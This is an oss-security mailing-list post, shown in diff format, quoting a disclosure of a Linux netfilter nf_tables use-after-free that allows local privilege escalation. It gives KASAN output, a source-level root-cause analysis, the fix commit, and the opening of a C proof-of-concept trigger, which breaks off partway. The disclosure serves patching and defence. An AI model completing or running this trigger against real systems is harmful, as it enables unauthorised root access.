@@ -1,0 +1,839 @@
+
+Date: Fri, 3 Jun 2022 08:31:41 +0200
+From: Salvatore Bonaccorso <carnil@...ian.org>
+To: oss-security@...ts.openwall.com
+Cc: Marian Rehak <mrehak@...hat.com>
+Subject: Re: Linux Kernel use-after-free write in netfilter
+
+Hi,
+
+On Tue, May 31, 2022 at 10:00:32AM +0100, EDG EDG wrote:
+> Hello,
+> 
+> A use-after-free write vulnerability was identified within the
+> netfilter subsystem
+> which can be exploited to achieve privilege escalation to root.
+> 
+> In order to trigger the issue it requires the ability to create user/net
+> namespaces.
+> 
+> This issue has been fixed within the following commit:
+> 
+> https://git.kernel.org/pub/scm/linux/kernel/git/netdev/net.git/commit/net/netfilter?id=520778042ccca019f3ffa136dd0ca565c486cedd
+> 
+> The issue was previously confirmed on the latest linux master (commit
+> 143a6252e1b8ab424b4b293512a97cca7295c182) and we have confirmed it can be
+> exploited for privilege escalation on Ubuntu 22.04 (Linux kernel
+> 5.15.0-27-generic).
+> 
+> # Technical Vulnerability Details
+> 
+> The bug is related to the failure to remove an expression from a set's bindings
+> list before destroying the expression. This specifically happens when specific
+> expressions that are not marked with the NFT_EXPR_STATEFUL flag are supplied as
+> a subexpression in a NFT_MSG_NEWSET command. We found that both the lookup and
+> dynset expressions will be added to a sets binding linked list upon
+> initialisation, but after the expression is detected as not being stateful, it
+> is destroyed without properly calling a function like nf_tables_unbind_set().
+> We found that this affects multiple expressions, at least the lookup and dynset
+> expressions.
+> 
+> This creates a state where any subsequent use of the set binding list, such
+> as expression addition or removal, will end up writing a link pointer address
+> into a slab object that has already been freed, and possibly reallocated.
+> 
+> ## KASAN Output
+> 
+> ```
+> [   85.431824] ==================================================================
+> [   85.432901] BUG: KASAN: use-after-free in nf_tables_bind_set+0x81b/0xa20
+> [   85.433825] Write of size 8 at addr ffff8880286f0e98 by task poc/776
+> [   85.434756]
+> [   85.434999] CPU: 1 PID: 776 Comm: poc Tainted: G        W         5.18.0+ #2
+> [   85.436023] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996),
+> BIOS 1.14.0-2 04/01/2014
+> [   85.437228] Call Trace:
+> [   85.437594]  <TASK>
+> [   85.437919]  dump_stack_lvl+0x49/0x5f
+> [   85.438470]  print_report.cold+0x5e/0x5cf
+> [   85.439073]  ? __cpuidle_text_end+0x4/0x4
+> [   85.439655]  ? nf_tables_bind_set+0x81b/0xa20
+> [   85.440286]  kasan_report+0xaa/0x120
+> [   85.440809]  ? delay_halt_mwaitx+0x31/0x50
+> [   85.441392]  ? nf_tables_bind_set+0x81b/0xa20
+> [   85.442022]  __asan_report_store8_noabort+0x17/0x20
+> [   85.442725]  nf_tables_bind_set+0x81b/0xa20
+> [   85.443338]  ? nft_set_elem_expr_destroy+0x2a0/0x2a0
+> [   85.444051]  ? nla_strcmp+0xa8/0xe0
+> [   85.444520]  ? nft_set_lookup_global+0x88/0x360
+> [   85.445157]  nft_lookup_init+0x463/0x620
+> [   85.445710]  nft_expr_init+0x13a/0x2a0
+> [   85.446242]  ? nft_obj_del+0x210/0x210
+> [   85.446778]  ? __kasan_check_write+0x14/0x20
+> [   85.447395]  ? rhashtable_init+0x326/0x6d0
+> [   85.447974]  ? __rcu_read_unlock+0xde/0x100
+> [   85.448565]  ? nft_rhash_init+0x213/0x2f0
+> [   85.449129]  ? nft_rhash_gc_init+0xb0/0xb0
+> [   85.449717]  ? nf_tables_newset+0x1646/0x2e40
+> [   85.450359]  ? jhash+0x630/0x630
+> [   85.450838]  nft_set_elem_expr_alloc+0x24/0x210
+> [   85.451507]  nf_tables_newset+0x1b3f/0x2e40
+> [   85.452124]  ? rcu_preempt_deferred_qs_irqrestore+0x579/0xa70
+> [   85.452948]  ? nft_set_elem_expr_alloc+0x210/0x210
+> [   85.453636]  ? delay_tsc+0x94/0xc0
+> [   85.454161]  nfnetlink_rcv_batch+0xeb4/0x1fd0
+> [   85.454808]  ? nfnetlink_rcv_msg+0x980/0x980
+> [   85.455444]  ? stack_trace_save+0x94/0xc0
+> [   85.456036]  ? filter_irq_stacks+0x90/0x90
+> [   85.456639]  ? __const_udelay+0x62/0x80
+> [   85.457206]  ? _raw_spin_lock_irqsave+0x99/0xf0
+> [   85.457864]  ? nla_get_range_signed+0x350/0x350
+> [   85.458528]  ? security_capable+0x5f/0xa0
+> [   85.459128]  nfnetlink_rcv+0x2f0/0x3b0
+> [   85.459669]  ? nfnetlink_rcv_batch+0x1fd0/0x1fd0
+> [   85.460327]  ? rcu_read_unlock_special+0x52/0x3b0
+> [   85.461000]  netlink_unicast+0x5ec/0x890
+> [   85.461563]  ? netlink_attachskb+0x750/0x750
+> [   85.462169]  ? __kasan_check_read+0x11/0x20
+> [   85.462766]  ? __check_object_size+0x226/0x3a0
+> [   85.463408]  netlink_sendmsg+0x830/0xd10
+> [   85.463968]  ? netlink_unicast+0x890/0x890
+> [   85.464552]  ? apparmor_socket_sendmsg+0x3d/0x50
+> [   85.465206]  ? netlink_unicast+0x890/0x890
+> [   85.465792]  sock_sendmsg+0xec/0x120
+> [   85.466303]  __sys_sendto+0x1e2/0x2e0
+> [   85.466821]  ? __ia32_sys_getpeername+0xb0/0xb0
+> [   85.467470]  ? alloc_file_pseudo+0x184/0x270
+> [   85.468070]  ? perf_callchain_user+0x60/0xa60
+> [   85.468683]  ? preempt_count_add+0x7f/0x170
+> [   85.469280]  ? fd_install+0x14f/0x330
+> [   85.469800]  ? __sys_socket+0x166/0x200
+> [   85.470342]  ? __sys_socket_file+0x1c0/0x1c0
+> [   85.470940]  ? debug_smp_processor_id+0x17/0x20
+> [   85.471583]  ? fpregs_assert_state_consistent+0x4e/0xb0
+> [   85.472308]  __x64_sys_sendto+0xe0/0x1a0
+> [   85.472854]  ? do_syscall_64+0x69/0x80
+> [   85.473379]  do_syscall_64+0x5c/0x80
+> [   85.473878]  ? fpregs_restore_userregs+0xf3/0x200
+> [   85.474532]  ? switch_fpu_return+0xe/0x10
+> [   85.475099]  ? exit_to_user_mode_prepare+0x140/0x170
+> [   85.475791]  ? irqentry_exit_to_user_mode+0x9/0x20
+> [   85.476465]  ? irqentry_exit+0x33/0x40
+> [   85.476991]  ? exc_page_fault+0x72/0xe0
+> [   85.477524]  entry_SYSCALL_64_after_hwframe+0x46/0xb0
+> [   85.478219] RIP: 0033:0x45c66a
+> [   85.478648] Code: d8 64 89 02 48 c7 c0 ff ff ff ff eb b8 0f 1f 00
+> f3 0f 1e fa 41 89 ca 64 8b 04 25 18 00 00 00 85 c0 75 15 b8 2c 00 00
+> 00 0f 05 <48> 3d 00 f0 ff ff 77 7e c3 0f 1f 44 00 00 41 54 48 83 ec 30
+> 44 89
+> [   85.481183] RSP: 002b:00007ffd091bfee8 EFLAGS: 00000246 ORIG_RAX:
+> 000000000000002c
+> [   85.482214] RAX: ffffffffffffffda RBX: 0000000000000174 RCX: 000000000045c66a
+> [   85.483190] RDX: 0000000000000174 RSI: 00007ffd091bfef0 RDI: 0000000000000003
+> [   85.484162] RBP: 00007ffd091c23b0 R08: 00000000004a94c8 R09: 000000000000000c
+> [   85.485128] R10: 0000000000000000 R11: 0000000000000246 R12: 00007ffd091c1ef0
+> [   85.486094] R13: 0000000000000004 R14: 0000000000002000 R15: 0000000000000000
+> [   85.487076]  </TASK>
+> [   85.487388]
+> [   85.487608] Allocated by task 776:
+> [   85.488082]  kasan_save_stack+0x26/0x50
+> [   85.488614]  __kasan_kmalloc+0x88/0xa0
+> [   85.489131]  __kmalloc+0x1b9/0x370
+> [   85.489602]  nft_expr_init+0xcd/0x2a0
+> [   85.490109]  nft_set_elem_expr_alloc+0x24/0x210
+> [   85.490731]  nf_tables_newset+0x1b3f/0x2e40
+> [   85.491314]  nfnetlink_rcv_batch+0xeb4/0x1fd0
+> [   85.491912]  nfnetlink_rcv+0x2f0/0x3b0
+> [   85.492429]  netlink_unicast+0x5ec/0x890
+> [   85.492985]  netlink_sendmsg+0x830/0xd10
+> [   85.493528]  sock_sendmsg+0xec/0x120
+> [   85.494035]  __sys_sendto+0x1e2/0x2e0
+> [   85.494545]  __x64_sys_sendto+0xe0/0x1a0
+> [   85.495109]  do_syscall_64+0x5c/0x80
+> [   85.495630]  entry_SYSCALL_64_after_hwframe+0x46/0xb0
+> [   85.496292]
+> [   85.496479] Freed by task 776:
+> [   85.496846]  kasan_save_stack+0x26/0x50
+> [   85.497351]  kasan_set_track+0x25/0x30
+> [   85.497893]  kasan_set_free_info+0x24/0x40
+> [   85.498489]  __kasan_slab_free+0x110/0x170
+> [   85.499103]  kfree+0xa7/0x310
+> [   85.499548]  nft_set_elem_expr_alloc+0x1b3/0x210
+> [   85.500219]  nf_tables_newset+0x1b3f/0x2e40
+> [   85.500822]  nfnetlink_rcv_batch+0xeb4/0x1fd0
+> [   85.501449]  nfnetlink_rcv+0x2f0/0x3b0
+> [   85.501990]  netlink_unicast+0x5ec/0x890
+> [   85.502558]  netlink_sendmsg+0x830/0xd10
+> [   85.503133]  sock_sendmsg+0xec/0x120
+> [   85.503655]  __sys_sendto+0x1e2/0x2e0
+> [   85.504194]  __x64_sys_sendto+0xe0/0x1a0
+> [   85.504779]  do_syscall_64+0x5c/0x80
+> [   85.505330]  entry_SYSCALL_64_after_hwframe+0x46/0xb0
+> [   85.506095]
+> [   85.506325] The buggy address belongs to the object at ffff8880286f0e80
+> [   85.506325]  which belongs to the cache kmalloc-cg-64 of size 64
+> [   85.508152] The buggy address is located 24 bytes inside of
+> [   85.508152]  64-byte region [ffff8880286f0e80, ffff8880286f0ec0)
+> [   85.509845]
+> [   85.510095] The buggy address belongs to the physical page:
+> [   85.510962] page:000000008955c452 refcount:1 mapcount:0
+> mapping:0000000000000000 index:0xffff8880286f0080 pfn:0x286f0
+> [   85.512566] memcg:ffff888054617c01
+> [   85.513079] flags: 0xffe00000000200(slab|node=0|zone=1|lastcpupid=0x3ff)
+> [   85.514070] raw: 00ffe00000000200 0000000000000000 dead000000000122
+> ffff88801b842780
+> [   85.515251] raw: ffff8880286f0080 000000008020001d 00000001ffffffff
+> ffff888054617c01
+> [   85.516421] page dumped because: kasan: bad access detected
+> [   85.517264]
+> [   85.517505] Memory state around the buggy address:
+> [   85.518231]  ffff8880286f0d80: fc fc fc fc fc fc fc fc fc fc fc fc
+> fc fc fc fc
+> [   85.519321]  ffff8880286f0e00: fa fb fb fb fb fb fb fb fc fc fc fc
+> fc fc fc fc
+> [   85.520392] >ffff8880286f0e80: fa fb fb fb fb fb fb fb fc fc fc fc
+> fc fc fc fc
+> [   85.521456]                             ^
+> [   85.522050]  ffff8880286f0f00: 00 00 00 00 00 00 00 fc fc fc fc fc
+> fc fc fc fc
+> [   85.523125]  ffff8880286f0f80: fa fb fb fb fb fb fb fb fc fc fc fc
+> fc fc fc fc
+> [   85.524200] ==================================================================
+> [   85.525364] Disabling lock debugging due to kernel taint
+> [   85.534106] ------------[ cut here ]------------
+> [   85.534874] WARNING: CPU: 1 PID: 776 at
+> net/netfilter/nf_tables_api.c:4592 nft_set_destroy+0x343/0x460
+> [   85.536269] Modules linked in:
+> [   85.536741] CPU: 1 PID: 776 Comm: poc Tainted: G    B   W         5.18.0+ #2
+> [   85.537792] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996),
+> BIOS 1.14.0-2 04/01/2014
+> [   85.539080] RIP: 0010:nft_set_destroy+0x343/0x460
+> [   85.539774] Code: 3c 02 00 0f 85 26 01 00 00 49 8b 7c 24 30 e8 94
+> f0 ee f1 4c 89 e7 e8 ec b0 da f1 48 83 c4 30 5b 41 5c 41 5d 41 5e 41
+> 5f 5d c3 <0f> 0b 48 83 c4 30 5b 41 5c 41 5d 41 5e 41 5f 5d c3 48 8b 7d
+> b0 e8
+> [   85.542475] RSP: 0018:ffff88805911f4f8 EFLAGS: 00010202
+> [   85.543282] RAX: 0000000000000002 RBX: dead000000000122 RCX: ffff88805911f508
+> [   85.544291] RDX: 0000000000000000 RSI: ffff888052ab1800 RDI: ffff888052ab1864
+> [   85.545331] RBP: ffff88805911f550 R08: ffff8880286ce908 R09: 0000000000000000
+> [   85.546371] R10: ffffed100b223e56 R11: 0000000000000001 R12: ffff888052ab1800
+> [   85.547447] R13: ffff8880286ce900 R14: dffffc0000000000 R15: ffff8880286ce780
+> [   85.548487] FS:  00000000018293c0(0000) GS:ffff88806a900000(0000)
+> knlGS:0000000000000000
+> [   85.549630] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+> [   85.550470] CR2: 00007ffd091bfee8 CR3: 0000000052156000 CR4: 00000000000006e0
+> [   85.551551] Call Trace:
+> [   85.551930]  <TASK>
+> [   85.552245]  ? rcu_read_unlock_special+0x52/0x3b0
+> [   85.552971]  __nf_tables_abort+0xd40/0x2f10
+> [   85.553612]  ? __udelay+0x15/0x20
+> [   85.554133]  ? __nft_release_basechain+0x5a0/0x5a0
+> [   85.554878]  ? rcu_read_unlock_special+0x52/0x3b0
+> [   85.555592]  nf_tables_abort+0x77/0xa0
+> [   85.556153]  nfnetlink_rcv_batch+0xb23/0x1fd0
+> [   85.556820]  ? nfnetlink_rcv_msg+0x980/0x980
+> [   85.557467]  ? stack_trace_save+0x94/0xc0
+> [   85.558065]  ? filter_irq_stacks+0x90/0x90
+> [   85.558682]  ? __const_udelay+0x62/0x80
+> [   85.559321]  ? _raw_spin_lock_irqsave+0x99/0xf0
+> [   85.559997]  ? nla_get_range_signed+0x350/0x350
+> [   85.560683]  ? security_capable+0x5f/0xa0
+> [   85.561307]  nfnetlink_rcv+0x2f0/0x3b0
+> [   85.561863]  ? nfnetlink_rcv_batch+0x1fd0/0x1fd0
+> [   85.562555]  ? rcu_read_unlock_special+0x52/0x3b0
+> [   85.563303]  netlink_unicast+0x5ec/0x890
+> [   85.563896]  ? netlink_attachskb+0x750/0x750
+> [   85.564546]  ? __kasan_check_read+0x11/0x20
+> [   85.565165]  ? __check_object_size+0x226/0x3a0
+> [   85.565838]  netlink_sendmsg+0x830/0xd10
+> [   85.566407]  ? netlink_unicast+0x890/0x890
+> [   85.567044]  ? apparmor_socket_sendmsg+0x3d/0x50
+> [   85.567724]  ? netlink_unicast+0x890/0x890
+> [   85.568334]  sock_sendmsg+0xec/0x120
+> [   85.568874]  __sys_sendto+0x1e2/0x2e0
+> [   85.569417]  ? __ia32_sys_getpeername+0xb0/0xb0
+> [   85.570086]  ? alloc_file_pseudo+0x184/0x270
+> [   85.570757]  ? perf_callchain_user+0x60/0xa60
+> [   85.571431]  ? preempt_count_add+0x7f/0x170
+> [   85.572054]  ? fd_install+0x14f/0x330
+> [   85.572612]  ? __sys_socket+0x166/0x200
+> [   85.573190]  ? __sys_socket_file+0x1c0/0x1c0
+> [   85.573805]  ? debug_smp_processor_id+0x17/0x20
+> [   85.574452]  ? fpregs_assert_state_consistent+0x4e/0xb0
+> [   85.575242]  __x64_sys_sendto+0xe0/0x1a0
+> [   85.575804]  ? do_syscall_64+0x69/0x80
+> [   85.576367]  do_syscall_64+0x5c/0x80
+> [   85.576901]  ? fpregs_restore_userregs+0xf3/0x200
+> [   85.577591]  ? switch_fpu_return+0xe/0x10
+> [   85.578179]  ? exit_to_user_mode_prepare+0x140/0x170
+> [   85.578947]  ? irqentry_exit_to_user_mode+0x9/0x20
+> [   85.579676]  ? irqentry_exit+0x33/0x40
+> [   85.580245]  ? exc_page_fault+0x72/0xe0
+> [   85.580824]  entry_SYSCALL_64_after_hwframe+0x46/0xb0
+> [   85.581577] RIP: 0033:0x45c66a
+> [   85.582059] Code: d8 64 89 02 48 c7 c0 ff ff ff ff eb b8 0f 1f 00
+> f3 0f 1e fa 41 89 ca 64 8b 04 25 18 00 00 00 85 c0 75 15 b8 2c 00 00
+> 00 0f 05 <48> 3d 00 f0 ff ff 77 7e c3 0f 1f 44 00 00 41 54 48 83 ec 30
+> 44 89
+> [   85.584728] RSP: 002b:00007ffd091bfee8 EFLAGS: 00000246 ORIG_RAX:
+> 000000000000002c
+> [   85.585784] RAX: ffffffffffffffda RBX: 0000000000000174 RCX: 000000000045c66a
+> [   85.586821] RDX: 0000000000000174 RSI: 00007ffd091bfef0 RDI: 0000000000000003
+> [   85.587835] RBP: 00007ffd091c23b0 R08: 00000000004a94c8 R09: 000000000000000c
+> [   85.588832] R10: 0000000000000000 R11: 0000000000000246 R12: 00007ffd091c1ef0
+> [   85.589820] R13: 0000000000000004 R14: 0000000000002000 R15: 0000000000000000
+> [   85.590899]  </TASK>
+> [   85.591243] ---[ end trace 0000000000000000 ]---
+> ```
+> 
+> ## Details
+> 
+> The vulnerability is due to a failure to properly clean up when a
+> lookup or dynset expression is encountered as a subexpression of
+> a `NFT_MSG_NEWSET` command. The `nf_tables_newset()` function is responsible
+> for handling the `NFT_MSG_NEWSET` netlink message.
+> 
+> From `nf_tables_api.c`:
+> 
+> ```cpp
+> static int nf_tables_newset(struct sk_buff *skb, const struct nfnl_info *info,
+>    const struct nlattr * const nla[])
+> {
+> u32 ktype, dtype, flags, policy, gc_int, objtype;
+> struct netlink_ext_ack *extack = info->extack;
+> u8 genmask = nft_genmask_next(info->net);
+> u8 family = info->nfmsg->nfgen_family;
+> const struct nft_set_ops *ops;
+> struct nft_expr *expr = NULL;
+> struct net *net = info->net;
+> struct nft_set_desc desc;
+> struct nft_table *table;
+> unsigned char *udata;
+> struct nft_set *set;
+> struct nft_ctx ctx;
+> size_t alloc_size;
+> u64 timeout;
+> char *name;
+> int err, i;
+> u16 udlen;
+> u64 size;
+> 
+> if (nla[NFTA_SET_TABLE] == NULL ||
+>    nla[NFTA_SET_NAME] == NULL ||
+>    nla[NFTA_SET_KEY_LEN] == NULL ||
+>    nla[NFTA_SET_ID] == NULL)
+> return -EINVAL;
+> ```
+> 
+> Assuming all the set creation field prerequisites are met, this function will
+> allocate `struct nft_set` structure to track the new set.
+> 
+> ```cpp
+>     set = kvzalloc(alloc_size, GFP_KERNEL);
+>     if (!set)
+>         return -ENOMEM;
+> 
+> [...]
+> 
+>     INIT_LIST_HEAD(&set->bindings);
+>     INIT_LIST_HEAD(&set->catchall_list);
+>     set->table = table;
+>     write_pnet(&set->net, net);
+>     set->ops = ops;
+>     set->ktype = ktype;
+>     set->klen = desc.klen;
+>     set->dtype = dtype;
+>     set->objtype = objtype;
+>     set->dlen = desc.dlen;
+>     set->flags = flags;
+>     set->size = desc.size;
+>     set->policy = policy;
+>     set->udlen = udlen;
+>     set->udata = udata;
+>     set->timeout = timeout;
+>     set->gc_int = gc_int;
+> ```
+> 
+> We can see above that it initializes the `set->bindings` list, which will be
+> say important later. After initialization the code will test whether or not
+> there are any subexpressions associated with the set, if so it will try to
+> handle the expression using a set-specific expression allocation handler:
+> 
+> ```cpp
+>     if (nla[NFTA_SET_EXPR]) {
+>         expr = nft_set_elem_expr_alloc(&ctx, set, nla[NFTA_SET_EXPR]);
+>         if (IS_ERR(expr)) {
+>             err = PTR_ERR(expr);
+>             goto err_set_expr_alloc;
+>         }
+>         set->exprs[0] = expr;
+>         set->num_exprs++;
+>     } else if (nla[NFTA_SET_EXPRESSIONS]) {
+>         [...]
+>     }
+> ```
+> 
+> If it encounters the `NFTA_SET_EXPR` we will call
+> `nft_set_elem_expr_alloc(&ctx, set, nla[NFTA_SET_EXPR]);`, to handle whatever
+> the subexpression type is. The set element expression allocation function is
+> quite simple:
+> 
+> From `nf_tables_api.c`:
+> 
+> ```cpp
+> struct nft_expr *nft_set_elem_expr_alloc(const struct nft_ctx *ctx,
+>                      const struct nft_set *set,
+>                      const struct nlattr *attr)
+> {
+>     struct nft_expr *expr;
+>     int err;
+> 
+>     expr = nft_expr_init(ctx, attr);
+>     if (IS_ERR(expr))
+>         return expr;
+> 
+>     err = -EOPNOTSUPP;
+>     if (!(expr->ops->type->flags & NFT_EXPR_STATEFUL))
+>         goto err_set_elem_expr;
+> 
+>     if (expr->ops->type->flags & NFT_EXPR_GC) {
+>         if (set->flags & NFT_SET_TIMEOUT)
+>             goto err_set_elem_expr;
+>         if (!set->ops->gc_init)
+>             goto err_set_elem_expr;
+>         set->ops->gc_init(set);
+>     }
+> 
+>     return expr;
+> 
+> err_set_elem_expr:
+>     nft_expr_destroy(ctx, expr);
+>     return ERR_PTR(err);
+> }
+> ```
+> 
+> The function above will first initialize an expression, and then only after
+> that expression is initialized will check whether or not that expression type
+> is actually of the type `NFT_EXPR_STATEFUL` that means it is allowed to be a
+> subexpression of a set. When the expression is deemed bad and gets destroyed,
+> the destruction looks like the following:
+> 
+> From `nf_tables_api.c`:
+> 
+> ```cpp
+> void nft_expr_destroy(const struct nft_ctx *ctx, struct nft_expr *expr)
+> {
+>     nf_tables_expr_destroy(ctx, expr);
+>     kfree(expr);
+> }
+> ```
+> 
+> We will look at nft_lookup as the example, although dynset is affected
+> identically.
+> 
+> We see that a `struct nft_lookup` structure is associated with the expression,
+> which looks like the following:
+> 
+> ```cpp
+> struct nft_lookup {
+>     struct nft_set * set;
+>     u8 sreg;
+>     u8 dreg;
+>     bool invert;
+>     struct nft_set_binding binding;
+> };
+> ```
+> 
+> and
+> 
+> ```cpp
+> /**
+>  *    struct nft_set_binding - nf_tables set binding
+>  *
+>  *    @list: set bindings list node
+>  *    @chain: chain containing the rule bound to the set
+>  *    @flags: set action flags
+>  *
+>  *    A set binding contains all information necessary for validation
+>  *    of new elements added to a bound set.
+>  */
+> struct nft_set_binding {
+>     struct list_head list;
+>     const struct nft_chain * chain;
+>     u32 flags;
+> };
+> ```
+> 
+> The `nft_lookup_init` function looks up a referenced set that must already
+> exist, and if it is found then the lookup expression will be bound to that set:
+> 
+> ```cpp
+>     struct nft_set *set;
+>     u32 flags;
+>     int err;
+> 
+>     if (tb[NFTA_LOOKUP_SET] == NULL ||
+>         tb[NFTA_LOOKUP_SREG] == NULL)
+>         return -EINVAL;
+> 
+>     set = nft_set_lookup_global(ctx->net, ctx->table, tb[NFTA_LOOKUP_SET],
+>                     tb[NFTA_LOOKUP_SET_ID], genmask);
+>     if (IS_ERR(set))
+>         return PTR_ERR(set);
+>     [...]
+> 
+>     priv->binding.flags = set->flags & NFT_SET_MAP;
+> 
+>     err = nf_tables_bind_set(ctx, set, &priv->binding);
+>     if (err < 0)
+>         return err;
+> 
+>     priv->set = set;
+>     return 0;
+> }
+> ```
+> 
+> The main point above is that it ends up calling `nf_tables_bind_set`, and
+> passing in the separate set that we just looked up, as well as the
+> address of the
+> `binding` member of the `nft_lookup`.
+> 
+> From: `nft_tables_api.c`
+> 
+> ```cpp
+> int nf_tables_bind_set(const struct nft_ctx *ctx, struct nft_set *set,
+>                struct nft_set_binding *binding)
+> {
+>     struct nft_set_binding *i;
+>     struct nft_set_iter iter;
+> 
+>     [...]
+>     if (binding->flags & NFT_SET_MAP) {
+>         [...]
+>     }
+> bind:
+>     binding->chain = ctx->chain;
+>     list_add_tail_rcu(&binding->list, &set->bindings);
+>     nft_set_trans_bind(ctx, set);
+>     set->use++;
+> 
+>     return 0;
+> }
+> 
+> ```
+> 
+> Assuming everything is ok the lookup expression is then bound to the bindings
+> list of the set with `list_add_tail_rcu(&binding->list, &set->bindings);`. This
+> puts the `nft_lookup` structure on to this bindings list. If this structure
+> ends up being subsequently destroyed, it should be removed from the
+> `set->bindings` list to avoid a dangling free pointer.
+> 
+> Recall it was shown earlier that if the expression is not NFT_EXPR_STATEFUL,
+> it's going to be destroyed immediately.
+> 
+> Revisiting the allocation function :
+> 
+> ```cpp
+> struct nft_expr *nft_set_elem_expr_alloc(const struct nft_ctx *ctx,
+> const struct nft_set *set,
+> const struct nlattr *attr)
+> {
+> struct nft_expr *expr;
+> int err;
+> 
+> expr = nft_expr_init(ctx, attr);
+> if (IS_ERR(expr))
+> return expr;
+> 
+> err = -EOPNOTSUPP;
+> if (!(expr->ops->type->flags & NFT_EXPR_STATEFUL))
+> goto err_set_elem_expr;
+> 
+> if (expr->ops->type->flags & NFT_EXPR_GC) {
+> if (set->flags & NFT_SET_TIMEOUT)
+> goto err_set_elem_expr;
+> if (!set->ops->gc_init)
+> goto err_set_elem_expr;
+> set->ops->gc_init(set);
+> }
+> 
+> return expr;
+> 
+> err_set_elem_expr:
+> nft_expr_destroy(ctx, expr);
+> return ERR_PTR(err);
+> }
+> ```
+> 
+> the `expr` variable will point to the `nft_lookup` structure that was
+> just added to the `set->bindings` list, and that expression type does not have
+> the `NFT_EXPR_STATEFUL` flag, so we hit:
+> 
+> ```cpp
+> err_set_elem_expr:
+> nft_expr_destroy(ctx, expr);
+> return ERR_PTR(err);
+> }
+> ```
+> 
+> Then the destruction:
+> 
+> ```cpp
+> void nft_expr_destroy(const struct nft_ctx *ctx, struct nft_expr *expr)
+> {
+> nf_tables_expr_destroy(ctx, expr);
+> kfree(expr);
+> }
+> ```
+> 
+> First the expression destructor is called before freeing the
+> `nft_lookup` object:
+> 
+> ```cpp
+> static void nf_tables_expr_destroy(const struct nft_ctx *ctx,
+>   struct nft_expr *expr)
+> {
+> const struct nft_expr_type *type = expr->ops->type;
+> 
+> if (expr->ops->destroy)
+> expr->ops->destroy(ctx, expr);
+> module_put(type->owner);
+> }
+> ```
+> 
+> This corresponds to `nft_lookup_destroy` function as shown in `nft_lookup.c`:
+> 
+> ```cpp
+> static const struct nft_expr_ops nft_lookup_ops = {
+>     [...]
+>     .destroy = nft_lookup_destroy,
+> ```
+> 
+> It tries to call a destruction routine on the associated set that was bound:
+> 
+> From: `nft_lookup.c`:
+> 
+> ```cpp
+> static void nft_lookup_destroy(const struct nft_ctx *ctx,
+>       const struct nft_expr *expr)
+> {
+> struct nft_lookup *priv = nft_expr_priv(expr);
+> 
+> nf_tables_destroy_set(ctx, priv->set);
+> }
+> ```
+> 
+> Finally we see that the set destruction routine is actually not going to do
+> anything because we never created an anonymous set, and the `bindings` list is
+> not empty because our lookup is associated with the set already:
+> 
+> ```cpp
+> void nf_tables_destroy_set(const struct nft_ctx *ctx, struct nft_set *set)
+> {
+> if (list_empty(&set->bindings) && nft_set_is_anonymous(set))
+> nft_set_destroy(ctx, set);
+> }
+> ```
+> 
+> After returning back to 'nft_expr_destroy', the expression will be freed, but
+> will have never been removed from 'set->bindings'.
+> 
+> # POC Code
+> 
+> #define _GNU_SOURCE
+> #include <arpa/inet.h>
+> #include <sched.h>
+> #include <unistd.h>
+> #include <stdio.h>
+> #include <stdlib.h>
+> #include <string.h>
+> #include <fcntl.h>
+> #include <err.h>
+> #include <libmnl/libmnl.h>
+> #include <libnftnl/chain.h>
+> #include <libnftnl/expr.h>
+> #include <libnftnl/rule.h>
+> #include <libnftnl/table.h>
+> #include <libnftnl/set.h>
+> #include <linux/netfilter.h>
+> #include <linux/netfilter/nf_tables.h>
+> #include <linux/netfilter/nfnetlink.h>
+> #include <sched.h>
+> #include <sys/types.h>
+> #include <signal.h>
+> #include <net/if.h>
+> #include <asm/types.h>
+> #include <linux/netlink.h>
+> #include <linux/rtnetlink.h>
+> #include <sys/socket.h>
+> #include <linux/ethtool.h>
+> #include <linux/sockios.h>
+> #include <sys/xattr.h>
+> #include <unistd.h>
+> 
+> // gcc poc.c -o poc -l mnl -l nftnl
+> // or static:
+> // gcc poc.c -o poc -static -L/usr/local/lib/ -l nftnl -l mnl
+> // ./poc
+> 
+> void
+> unshare_setup(uid_t uid, gid_t gid)
+> {
+>     int temp;
+>     char edit[0x100];
+> 
+>     unshare(CLONE_NEWNS|CLONE_NEWUSER|CLONE_NEWNET);
+> 
+>     temp = open("/proc/self/setgroups", O_WRONLY);
+>     write(temp, "deny", strlen("deny"));
+>     close(temp);
+> 
+>     temp = open("/proc/self/uid_map", O_WRONLY);
+>     snprintf(edit, sizeof(edit), "0 %d 1", uid);
+>     write(temp, edit, strlen(edit));
+>     close(temp);
+> 
+>     temp = open("/proc/self/gid_map", O_WRONLY);
+>     snprintf(edit, sizeof(edit), "0 %d 1", gid);
+>     write(temp, edit, strlen(edit));
+>     close(temp);
+> 
+>     return;
+> }
+> 
+> void
+> netfilter()
+> {
+>     char * table_name = "table";
+>     char * set_name = NULL;
+>     uint8_t family = NFPROTO_IPV4;
+>     uint32_t set_id = 1;
+> 
+>     // a table for the sets to be associated with
+>     struct nftnl_table * table = nftnl_table_alloc();
+>     nftnl_table_set_str(table, NFTNL_TABLE_NAME, table_name);
+>     nftnl_table_set_u32(table, NFTNL_TABLE_FLAGS, 0);
+> 
+>     // expressions
+>     struct nftnl_expr * exprs[128];
+>     int exprid = 0;
+> 
+>     // sets
+>     struct nftnl_set * set_stable =  nftnl_set_alloc();
+>     struct nftnl_set * set_trigger =  nftnl_set_alloc();
+>     struct nftnl_set * set_uaf =  nftnl_set_alloc();
+> 
+>     // we need a set that we can look up with another expression
+>     set_name = "set_stable";
+>     nftnl_set_set_str(set_stable, NFTNL_SET_TABLE, table_name);
+>     nftnl_set_set_str(set_stable, NFTNL_SET_NAME, set_name);
+>     nftnl_set_set_u32(set_stable, NFTNL_SET_KEY_LEN, 1);
+>     nftnl_set_set_u32(set_stable, NFTNL_SET_FAMILY, family);
+>     nftnl_set_set_u32(set_stable, NFTNL_SET_ID, set_id++);
+> 
+>     // the set that will fail, due to a bad lookup expression, leaving a
+>     // dangling pointer on set->bindings
+>     set_name = "set_trigger";
+>     nftnl_set_set_str(set_trigger, NFTNL_SET_TABLE, table_name);
+>     nftnl_set_set_str(set_trigger, NFTNL_SET_NAME, set_name);
+>     nftnl_set_set_u32(set_trigger, NFTNL_SET_FLAGS, NFT_SET_EXPR);
+>     nftnl_set_set_u32(set_trigger, NFTNL_SET_KEY_LEN, 1);
+>     nftnl_set_set_u32(set_trigger, NFTNL_SET_FAMILY, family);
+>     nftnl_set_set_u32(set_trigger, NFTNL_SET_ID, set_id);
+>     exprs[exprid] = nftnl_expr_alloc("lookup");
